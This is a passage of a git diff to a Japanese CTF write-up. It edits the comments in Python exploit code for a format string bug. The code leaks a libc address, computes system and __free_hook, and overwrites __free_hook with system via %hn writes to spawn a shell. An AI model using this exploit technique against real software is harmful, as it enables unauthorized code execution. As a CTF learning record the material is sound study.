@@ -296,21 +296,21 @@ GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名�
 4. fsbで`system`を`__free_hook`に書き込む
 5. メニュー画面で1〜4以外のキー入力をしてプログラムを終了させる = `free`が呼ばれる
 
-またfsbによるメモリー内容のリークや任意アドレスへの書き込みは下記サイトが役に立つので適宜参照しながらエクスプロイトを作っていった。
+またfsbによるメモリー内容のリークや任意アドレスへの書き込みは下記サイトが役に立つので適宜参照しながらエクスプロイトを作っていった。  
 [fsbの資料](https://gist.github.com/hhc0null/08c43983b4551f506722)
 
 ```P
-    add("sh"+"A\0") <--- 1番目のアイテムにshを書いておく、末尾がnullされるので適応な文字"A"を追加
-    comment("0","BBBAAAA %p %p %p %p %p %p %p") <--- fsbによりスタックをリーク
+    add("sh"+"A\0") # 1番目のアイテムにshを書いておく、末尾がnullされるので適応な文字"A"を追加
+    comment("0","BBBAAAA %p %p %p %p %p %p %p") # fsbによりスタックをリーク
 
     # leak libc
     read_until(f,"AAAA ")
     read_until(f," 0x")
-    libc = int(f.read(8),16) - _IO_2_1_stdin_offset  <--- libcベースアドレスを計算
+    libc = int(f.read(8),16) - _IO_2_1_stdin_offset  # libcベースアドレスを計算
     print "libc: ",hex(libc)
-    system = libc + system_offset   <--- systemを計算
+    system = libc + system_offset   # systemを計算
     print "system: ",hex(system)
-    free_hook = libc + free_hook_offset  <--- __free_hookを計算
+    free_hook = libc + free_hook_offset  # __free_hookを計算
     print "free_hook: ",hex(free_hook)
     
     # set system in __free_hook
@@ -318,7 +318,7 @@ GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名�
     print hex(system1)
     system2 = u(p(system)[2:]+"\x00"*2)
     print hex(system2)
-    comment("0","%"+str(system1)+"x%10$hn%"+"P"+p(free_hook))    <--- systemのアドレスを2バイトづつ__free_hookに書き込む
+    comment("0","%"+str(system1)+"x%10$hn%"+"P"+p(free_hook))    # systemのアドレスを2バイトづつ__free_hookに書き込む
     comment("0","%"+str(system2)+"x%10$hn%"+"P"+p(free_hook+2))
 
     # trigger free
